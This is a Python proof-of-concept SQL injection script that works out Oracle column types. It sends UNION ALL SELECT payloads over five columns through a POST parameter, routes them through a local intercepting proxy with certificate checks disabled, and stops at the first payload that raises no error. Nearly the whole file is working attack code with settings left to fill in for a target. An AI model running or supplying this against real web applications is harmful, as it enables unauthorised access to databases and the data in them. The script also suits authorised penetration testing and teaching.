################################################################################################
#  Description:  
#  A rough HTTP POST based POC for determining the column types in an oracle database using SQL injection
#
#  Author: b0yd
#
################################################################################################

import requests
import urllib
import sys

#Comment out if not using a proxy like Burp, etc
proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}

#Set this to the parameter name for the POST request
post_param_name = "param1"

#Set this to the error string that is in the return page if the SQL query has an error
error_str_in_page = "exception"

#Example User Agent string
headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
           'Content-Type':'application/x-www-form-urlencoded'}

#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

#Read file
url = "https://example.com/page.html"

def make_request( addr, data ):
      
  #add post data
  p_data = urllib.urlencode({post_param_name : data})  
  
  #Setup request
  r = requests.post(addr, data = p_data, proxies=proxies, verify=False, headers=headers)
  return r.text

#Array of different oracle database types, ie, string, number, date, date
type_arry = {"null","1", "TO_DATE('2012-06-05', 'YYYY-MM-DD')"}

#Setup for a sql database with 5 columns
for a in type_arry:
  for b in type_arry:
    for c in type_arry:
      for d in type_arry:
        for e in type_arry:
          data = "1' union all select %s,%s,%s,%s,%s from dual --" % (a,b,c,d,e)
          ret = make_request(url, data)
          if error_str_in_page not in ret:
            print data
            sys.exit(0)
